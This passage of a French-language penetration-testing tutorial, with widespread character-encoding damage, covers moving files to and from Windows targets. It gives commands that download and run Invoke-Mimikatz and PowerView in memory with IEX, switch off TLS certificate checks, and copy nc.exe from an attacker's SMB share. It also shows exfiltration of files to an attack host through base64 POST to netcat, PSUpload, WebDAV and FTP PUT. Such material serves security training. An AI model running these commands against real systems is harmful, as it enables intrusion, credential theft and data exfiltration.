<p>Comme nous l'avons vu prÃ©cÃ©demment, les attaques sans fichier fonctionnent en utilisant certaines fonctions du systÃ¨me d'exploitation pour tÃ©lÃ©charger la charge utile et l'exÃ©cuter directement. </p>
<p>PowerShell peut Ã©galement Ãªtre utilisÃ© pour effectuer des attaques sans fichier. </p>
<p>Au lieu de tÃ©lÃ©charger un script PowerShell sur disque, nous pouvons l'exÃ©cuter directement en mÃ©moire Ã  l'aide du Invoke-Expression cmdlet ou l'alias IEX.</p>
<pre><code class="language-powershell">PS C:\pc&gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
</code></pre>
<p>IEX accepte Ã©galement les entrÃ©es de pipeline.</p>
<pre><code class="language-powershell">PS C:\pc&gt; (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
</code></pre>
<h3 id="powershell-invoke-webrequest">PowerShell Invoke-WebRequest</h3>
<p>Ã partir de PowerShell 3.0, le Invoke-WebRequest cmdlet est Ã©galement disponible, mais il est nettement plus lent Ã  tÃ©lÃ©charger des fichiers. </p>
<p>Vous pouvez utiliser les alias iwr, curl, et wget au lieu de la Invoke-WebRequest nom complet.</p>
<pre><code class="language-powershell">PS C:\pc&gt; Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
</code></pre>
<p>https://gist.github.com/HarmJ0y/bb48307ffa663256e239</p>
<h3 id="erreurs-courantes-avec-powershell">Erreurs courantes avec PowerShell</h3>
<p>Il peut y avoir des cas oÃ¹ la configuration du premier lancement d'Internet Explorer n'est pas terminÃ©e, ce qui empÃªche le tÃ©lÃ©chargement.</p>
<p><img alt="" src="../capture/1.PNG" /></p>
<p>Cela peut Ãªtre contournÃ© Ã  l'aide du paramÃ¨tre -UseBasicParsing.</p>
<pre><code class="language-powershell">PS C:\pc&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\pc&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 -UseBasicParsing | IEX
</code></pre>
<p>Une autre erreur dans les tÃ©lÃ©chargements PowerShell est liÃ©e au canal sÃ©curisÃ© SSL / TLS si le certificat n'est pas fiable. Nous pouvons contourner cette erreur avec la commande suivante:</p>
<pre><code class="language-powershell">PS C:\pc&gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling &quot;DownloadString&quot; with &quot;1&quot; argument(s): &quot;The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel.&quot;
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\pc&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
</code></pre>
<h2 id="telechargements-smb">TÃ©lÃ©chargements SMB</h2>
<p>Le protocole SMB qui s'exÃ©cute sur le port TCP / 445 est courant dans les rÃ©seaux d'entreprise oÃ¹ les services Windows s'exÃ©cutent. </p>
<p>Il permet aux applications et aux utilisateurs de transfÃ©rer des fichiers vers et depuis des serveurs distants.</p>
<p>Nous pouvons utiliser SMB pour tÃ©lÃ©charger facilement des fichiers depuis notre Pwnbox. </p>
<p>Nous devons crÃ©er un serveur SMB dans notre Pwnbox avec smbserver.py de Impacket puis utiliser copy, move, PowerShell Copy-Item, ou tout autre outil permettant la connexion Ã  SMB.</p>
<h3 id="creer-le-serveur-smb">CrÃ©er le serveur SMB</h3>
<pre><code class="language-sh">admin@pc[/pc]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</code></pre>
<h3 id="copiez-un-fichier-a-partir-du-serveur-smb">Copiez un fichier Ã  partir du serveur SMB</h3>
<pre><code class="language-powershell">C:\pc&gt; copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
</code></pre>
<p>Les nouvelles versions de Windows bloquent l'accÃ¨s non authentifiÃ© des invitÃ©s, comme nous pouvons le voir dans la commande suivante:</p>
<pre><code class="language-powershell">C:\pc&gt; copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
</code></pre>
<h3 id="creez-le-serveur-smb-avec-un-nom-dutilisateur-et-un-mot-de-passe">CrÃ©ez le serveur SMB avec un nom d'utilisateur et un mot de passe</h3>
<pre><code class="language-sh">admin@pc[/pc]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</code></pre>
<h3 id="monter-le-serveur-smb-avec-nom-dutilisateur-et-mot-de-passe">Monter le serveur SMB avec nom d'utilisateur et mot de passe</h3>
<pre><code class="language-powershell">C:\pc&gt; net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\pc&gt; copy n:\nc.exe
        1 file(s) copied.
</code></pre>
<p>Remarque: Vous pouvez Ã©galement monter le serveur SMB si vous recevez une erreur lorsque vous utilisez <code>copy filename \\ IP \ sharename</code>.</p>
<h2 id="telechargements-ftp">TÃ©lÃ©chargements FTP</h2>
<p>Une autre faÃ§on de transfÃ©rer des fichiers consiste Ã  utiliser FTP ( File Transfer Protocol ), qui utilise le port TCP / 21 et TCP / 20.</p>
<p>Nous pouvons utiliser le client FTP ou PowerShell Net.WebClient pour tÃ©lÃ©charger des fichiers Ã  partir d'un serveur FTP.</p>
<p>Nous pouvons configurer un serveur FTP dans notre hÃ´te d'attaque Ã  l'aide de Python3 pyftpdlib module. </p>
<p>Il peut Ãªtre installÃ© avec la commande suivante:</p>
<pre><code class="language-sh">admin@pc[/pc]$ sudo pip3 install pyftpdlib
</code></pre>
<p>Ensuite, nous pouvons spÃ©cifier le port numÃ©ro 21 car, par dÃ©faut, pyftpdlib utilise le port 2121. </p>
<p>L'authentification anonyme est activÃ©e par dÃ©faut si nous ne dÃ©finissons pas d'utilisateur et de mot de passe.</p>
<h3 id="configuration-dun-serveur-ftp-python3">Configuration d'un serveur FTP Python3</h3>
<pre><code class="language-sh">admin@pc[/pc]$ sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=3210 &lt;&lt;&lt;
</code></pre>
<h3 id="transferer-des-fichiers-a-partir-dun-serveur-ftp-a-laide-de-powershell">TransfÃ©rer des fichiers Ã  partir d'un serveur FTP Ã  l'aide de PowerShell</h3>
<pre><code class="language-powershell">PS C:\pc&gt; (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')
</code></pre>
<p>Lorsque nous obtenons un shell sur une machine distante, nous n'avons peut-Ãªtre pas de shell interactif.</p>
<p>Si tel est le cas, nous pouvons crÃ©er un fichier de commande FTP pour tÃ©lÃ©charger un fichier. </p>
<p>Tout d'abord, nous devons crÃ©er un fichier contenant les commandes que nous voulons exÃ©cuter, puis utiliser le client FTP pour utiliser ce fichier pour tÃ©lÃ©charger ce fichier.</p>
<h3 id="creer-un-fichier-de-commande-pour-le-client-ftp-et-telecharger-le-fichier-cible">CrÃ©er un fichier de commande pour le client FTP et tÃ©lÃ©charger le fichier cible</h3>
<pre><code class="language-powershell">C:\pc&gt; echo open 192.168.49.128 &gt; ftpcommand.txt
C:\pc&gt; echo USER anonymous &gt;&gt; ftpcommand.txt
C:\pc&gt; echo binary &gt;&gt; ftpcommand.txt
C:\pc&gt; echo GET file.txt &gt;&gt; ftpcommand.txt
C:\pc&gt; echo bye &gt;&gt; ftpcommand.txt
C:\pc&gt; ftp -v -n -s:ftpcommand.txt
ftp&gt; open 192.168.49.128
Log in with USER and PASS first.
ftp&gt; USER anonymous

ftp&gt; GET file.txt
ftp&gt; bye

C:\pc&gt;more file.txt
This is a test file
</code></pre>
<p>Il existe Ã©galement des situations telles que la fissuration par mot de passe, l'analyse, l'exfiltration, etc., oÃ¹ nous devons tÃ©lÃ©charger des fichiers de notre machine cible dans notre hÃ´te d'attaque. </p>
<p>Nous pouvons utiliser les mÃªmes mÃ©thodes que nous avons utilisÃ©es prÃ©cÃ©dement.</p>
<p>Voyons comment nous pouvons effectuer le tÃ©lÃ©chargement de fichiers de diffÃ©rentes maniÃ¨res.</p>
<h2 id="powershell-base64-encode-decode">PowerShell Base64 Encode &amp; Decode</h2>
<h3 id="encoder-le-fichier-a-laide-de-powershell">Encoder le fichier Ã  l'aide de PowerShell</h3>
<p>````powershell
 PS C:\pc&gt; [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))</p>
<p>IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
PS C:\pc&gt; Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash</p>
<p>Hash
3688374325B992DEF12793500307566D</p>
<pre><code>
Nous copions ce contenu et le collons dans notre hÃ´te d'attaque, utilisons la commande base64 pour le dÃ©coder et utiliser le md5sum application pour confirmer le transfert s'est dÃ©roulÃ© correctement.

### Decode Base64 String sous Linux

````sh
admin@pc[/pc]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d &gt; hosts
</code></pre>
<pre><code class="language-sh">admin@pc[/pc]$ md5sum hosts 

3688374325b992def12793500307566d  hosts
</code></pre>
<h2 id="telechargements-web-powershell_1">TÃ©lÃ©chargements Web PowerShell</h2>
<p>PowerShell n'a pas de fonction intÃ©grÃ©e pour les opÃ©rations de tÃ©lÃ©chargement, mais nous pouvons utiliser Invoke-WebRequest ou Invoke-RestMethod pour construire notre fonction de tÃ©lÃ©chargement. Nous aurons Ã©galement besoin d'un serveur Web qui accepte les tÃ©lÃ©chargements, ce qui n'est pas une option par dÃ©faut dans la plupart des utilitaires de serveur Web courants.</p>
<p>Pour notre serveur Web, nous pouvons utiliser <a href="https://github.com/Densaugeo/uploadserver">serveur de telechargement</a>, un module Ã©tendu du Python <a href="https://docs.python.org/3/library/http.server.html">http.Server</a>, qui comprend une page de tÃ©lÃ©chargement de fichiers. Installons-le et dÃ©marrons le serveur Web.</p>
<h3 id="installation-dun-serveur-web-configure-avec-telechargement">Installation d'un serveur Web configurÃ© avec tÃ©lÃ©chargement</h3>
<pre><code class="language-sh">admin@pc[/pc]$ pip3 install uploadserver

Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
</code></pre>
<pre><code class="language-sh">admin@pc[/pc]$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</code></pre>
<p>Nous pouvons maintenant utiliser un script PowerShell PSUpload.ps1 qui utilise Invoke-WebRequest pour effectuer les opÃ©rations de tÃ©lÃ©chargement. </p>
<p>Le script accepte deux paramÃ¨tres -File, que nous utilisons pour spÃ©cifier le chemin de fichier, et -Uri, l'URL du serveur oÃ¹ nous tÃ©lÃ©chargerons notre fichier.</p>
<p>Essayons de tÃ©lÃ©charger le fichier hÃ´te Ã  partir de notre hÃ´te Windows.</p>
<pre><code class="language-powershell">PS C:\pc&gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\pc&gt; Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
</code></pre>
<h2 id="telechargement-web-powershell-base64">TÃ©lÃ©chargement Web PowerShell Base64</h2>
<p>Une autre faÃ§on d'utiliser les fichiers codÃ©s PowerShell et base64 pour les opÃ©rations de tÃ©lÃ©chargement consiste Ã  utiliser Invoke-WebRequest ou Invoke-RestMethod avec Netcat. </p>
<p>Nous utilisons Netcat pour Ã©couter sur un port que nous spÃ©cifions et envoyer le fichier en tant que demande POST. </p>
<p>Enfin, nous copions la sortie et utilisons la fonction de dÃ©codage base64 pour convertir la chaÃ®ne base64 en fichier.</p>
<pre><code class="language-powershell">PS C:\pc&gt; $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\pc&gt; Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
</code></pre>
<p>Nous capturons les donnÃ©es base64 avec Netcat et utilisons l'application base64 avec l'option de dÃ©codage pour convertir la chaÃ®ne en fichier.</p>
<pre><code class="language-sh">admin@pc[/pc]$ nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
...SNIP...
</code></pre>
<pre><code class="language-sh">admin@pc[/pc]$ echo &lt;base64&gt; | base64 -d -w 0 &gt; hosts
</code></pre>
<h2 id="telechargements-smb_1">TÃ©lÃ©chargements SMB</h2>
<p>Nous avons prÃ©cÃ©demment vu que les entreprises autorisent souvent le trafic sortant Ã  l'aide des protocoles HTTP ( TCP / 80 ) et HTTPS ( TCP / 443 ). </p>
<p>GÃ©nÃ©ralement, les entreprises n'autorisent pas le protocole SMB ( TCP / 445 ) hors de leur rÃ©seau interne, car cela peut les ouvrir Ã  des attaques potentielles. </p>
<p>Pour plus d'informations Ã  ce sujet, nous pouvons lire la publication Microsoft <a href="https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a">EmpÃªcher le trafic SMB des connexions latÃ©rales et entrer ou quitter le rÃ©seau</a>.</p>
<p>Une alternative consiste Ã  exÃ©cuter SMB sur HTTP avec WebDav.</p>
<p>WebDAV ( RFC 4918 ) est une extension de HTTP, le protocole Internet que les navigateurs Web et les serveurs Web utilisent pour communiquer entre eux. </p>
<p>Le protocole WebDAV permet Ã  un serveur Web de se comporter comme un serveur de fichiers, prenant en charge la crÃ©ation de contenu collaboratif. </p>
<p>WebDAV peut Ã©galement utiliser HTTPS.</p>
<p>Lorsque vous utilisez SMB, il tentera d'abord de se connecter Ã  l'aide du protocole SMB, et s'il n'y a pas de part SMB disponible, il essaiera de se connecter Ã  l'aide du protocole HTTP. </p>
<p>Dans la capture de Wireshark suivante, nous essayons de nous connecter au partage de fichiers testing3, et parce qu'il n'a rien trouvÃ© avec SMB, il utilise HTTP.</p>
<p><img alt="" src="../capture/2.png" /></p>
<h4 id="configuration-du-serveur-webdav">Configuration du serveur WebDav</h4>
<p>Pour configurer notre serveur WebDav, nous devons installer deux modules Python, wsgidav et cheroot ( vous pouvez en savoir plus sur cette implÃ©mentation ici: <a href="https://github.com/mar10/wsgidav">wsgidav github</a>)). </p>
<p>AprÃ¨s les avoir installÃ©s, nous exÃ©cutons le wsgidav application dans le rÃ©pertoire cible.</p>
<h3 id="installation-des-modules-webdav-python">Installation des modules WebDav Python</h3>
<pre><code class="language-sh">admin@pc[/pc]$ sudo pip install wsgidav cheroot

[sudo] password for plaintext: 
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
     |ââââââââââââââââââââââââââââââââ| 171 kB 1.4 MB/s
     ...SNIP...
</code></pre>
<h3 id="utilisation-du-module-webdav-python">Utilisation du module WebDav Python</h3>
<pre><code class="language-sh">admin@pc[/pc]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

[sudo] password for plaintext: 
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
10:02:53.950 - INFO    : Property manager:  None
10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
10:02:53.950 - INFO    : Registered DAV providers by route:
10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
</code></pre>
<h3 id="connexion-au-partage-webdav">Connexion au partage Webdav</h3>
<p>Nous pouvons maintenant essayer de nous connecter au partage en utilisant le DavWWWRoot rÃ©pertoire.</p>
<pre><code class="language-powershell">C:\pc&gt; dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    &lt;DIR&gt;          .
05/18/2022  10:05 AM    &lt;DIR&gt;          ..
05/18/2022  10:05 AM    &lt;DIR&gt;          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
</code></pre>
<blockquote>
<p>Remarque: DavWWWRoot est un mot clÃ© spÃ©cial reconnu par Windows Shell. Aucun dossier de ce type n'existe sur votre serveur WebDAV. Le mot clÃ© DavWWRoot indique au pilote Mini-Redirector, qui gÃ¨re les demandes WebDAV que vous vous connectez Ã  la racine du serveur WebDAV.</p>
<p>Vous pouvez Ã©viter d'utiliser ce mot-clÃ© si vous spÃ©cifiez un dossier qui existe sur votre serveur lors de la connexion au serveur. Par exemple: \ 192.168.49.128 \ sharefolder</span></p>
</blockquote>
<h3 id="telechargement-de-fichiers-a-laide-de-smb">TÃ©lÃ©chargement de fichiers Ã  l'aide de SMB</h3>
<pre><code class="language-powershell">C:\pc&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\pc&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
</code></pre>
<blockquote>
<p>Remarque: S'il n'y a pas de restrictions SMB ( TCP / 445 ), vous pouvez utiliser impacket-smbserver de la mÃªme maniÃ¨re que nous l'avons configurÃ© pour les opÃ©rations de tÃ©lÃ©chargement.</p>
</blockquote>
<h2 id="telechargements-ftp_1">TÃ©lÃ©chargements FTP</h2>
<p>Le tÃ©lÃ©chargement de fichiers Ã  l'aide de FTP est trÃ¨s similaire au tÃ©lÃ©chargement de fichiers. </p>
<p>Nous pouvons utiliser PowerShell ou le client FTP pour executer l'opÃ©ration. </p>
<p>Avant de dÃ©marrer notre serveur FTP Ã  l'aide du module Python pyftpdlib, nous devons spÃ©cifier l'option --write pour permettre aux clients de tÃ©lÃ©charger des fichiers sur notre hÃ´te d'attaque.</p>
<pre><code class="language-sh">admin@pc[/pc]$ sudo python3 -m pyftpdlib --port 21 --write

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn(&quot;write permissions assigned to anonymous user.&quot;,
[I 2022-05-18 10:33:31] concurrency model: async
[I 2022-05-18 10:33:31] masquerade (NAT) address: None
[I 2022-05-18 10:33:31] passive ports: None
[I 2022-05-18 10:33:31] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=5155 &lt;&lt;&lt;
</code></pre>
<p>Utilisons maintenant la fonction de tÃ©lÃ©chargement PowerShell pour tÃ©lÃ©charger un fichier sur notre serveur FTP.</p>
<h3 id="fichier-de-telechargement-powershell">Fichier de tÃ©lÃ©chargement PowerShell</h3>
<pre><code class="language-powershell">PS C:\pc&gt; (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
</code></pre>
<h3 id="creer-un-fichier-de-commande-pour-le-client-ftp-pour-telecharger-un-fichier">CrÃ©er un fichier de commande pour le client FTP pour tÃ©lÃ©charger un fichier</h3>
<pre><code class="language-powershell">C:\pc&gt; echo open 192.168.49.128 &gt; ftpcommand.txt
C:\pc&gt; echo USER anonymous &gt;&gt; ftpcommand.txt
C:\pc&gt; echo binary &gt;&gt; ftpcommand.txt
C:\pc&gt; echo PUT c:\windows\system32\drivers\etc\hosts &gt;&gt; ftpcommand.txt
C:\pc&gt; echo bye &gt;&gt; ftpcommand.txt
C:\pc&gt; ftp -v -n -s:ftpcommand.txt
ftp&gt; open 192.168.49.128

Log in with USER and PASS first.


ftp&gt; USER anonymous
ftp&gt; PUT c:\windows\system32\drivers\etc\hosts
ftp&gt; bye
</code></pre>





                
              </article>
            </div>
          
          
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.74e28a9f.min.js", "translations": {"clipboard.copied": "Copi\u00e9 dans le presse-papier", "clipboard.copy": "Copier dans le presse-papier", "search.result.more.one": "1 de plus sur cette page", "search.result.more.other": "# de plus sur cette page", "search.result.none": "Aucun document trouv\u00e9", "search.result.one": "1 document trouv\u00e9", "search.result.other": "# documents trouv\u00e9s", "search.result.placeholder": "Taper pour d\u00e9marrer la recherche", "search.result.term.missing": "Non trouv\u00e9", "select.version": "S\u00e9lectionner la version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.220ee61c.min.js"></script>
      
    
  </body>
</html>